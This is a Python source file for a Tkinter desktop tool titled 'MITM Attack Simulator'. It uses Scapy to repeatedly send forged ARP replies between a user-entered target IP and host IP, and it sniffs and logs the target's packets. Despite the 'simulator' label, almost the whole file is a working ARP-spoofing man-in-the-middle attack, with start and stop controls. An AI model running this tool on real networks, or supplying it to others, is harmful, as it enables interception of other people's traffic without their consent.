import tkinter as tk
from tkinter import messagebox
from scapy.all import send, get_if_hwaddr, conf, sniff
from scapy.layers.inet import IP, Ether
from scapy.layers.l2 import ARP, srp
import threading
import time

class MITMAttackApp:
    def __init__(self, master):
        self.master = master
        master.title("MITM Attack Simulator")

        self.target_ip = tk.StringVar()
        self.host_ip = tk.StringVar()

        tk.Label(master, text="Target IP:").grid(row=0)
        tk.Entry(master, textvariable=self.target_ip).grid(row=0, column=1)

        tk.Label(master, text="Host IP:").grid(row=1)
        tk.Entry(master, textvariable=self.host_ip).grid(row=1, column=1)

        self.start_button = tk.Button(master, text="Start Attack", command=self.start_attack)
        self.start_button.grid(row=2, column=0)

        self.stop_button = tk.Button(master, text="Stop Attack", command=self.stop_attack)
        self.stop_button.grid(row=2, column=1)

        # 日志区域 / log
        self.log_text = tk.Text(master, height=20, width=70, state="disabled")
        self.log_text.grid(row=3, column=0, columnspan=2, pady=10)

        self.attacking = False


    def log(self, message):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.config(state="disabled")
        self.log_text.see(tk.END)

    def spoof(self, target_ip, host_ip):  # 伪造ARP响应包
        arp_response = ARP(op=2, psrc=host_ip, hwsrc=get_if_hwaddr(conf.iface), pdst=target_ip)
        send(arp_response, verbose=False)
        self.log(f"Send ARP response to {target_ip} pretening to be {host_ip}")

    def attack(self):  # 执行中间人攻击
        self.attacking = True
        target_ip = self.target_ip.get()
        host_ip = self.host_ip.get()

        threading.Thread(target=self.capture_packets).start()

        while self.attacking:
            self.spoof(target_ip, host_ip)
            self.spoof(host_ip, target_ip)
            time.sleep(2)

    def capture_packets(self):
        sniff(prn=self.process_packet, filter=f"ip host {self.target_ip.get()}", store=0, stop_filter=lambda x: not self.attacking)

    def process_packet(self, packet):
        if IP in packet:
            message = f"Captured Packet: {packet.summary()}"
            self.log(message)

    def start_attack(self): # Start the attack
        if not self.attacking:
            self.thread = threading.Thread(target=self.attack)
            self.thread.start()
            self.log("Attack started ... ")

    def stop_attack(self):  # Stop the attack
        self.attacking = False
        self.log("Attack Stopped.")
        messagebox.showinfo("Attack Stopped", "The attack has been stopped.")

if __name__ == "__main__":
    root = tk.Tk()
    app = MITMAttackApp(root)
    root.mainloop()
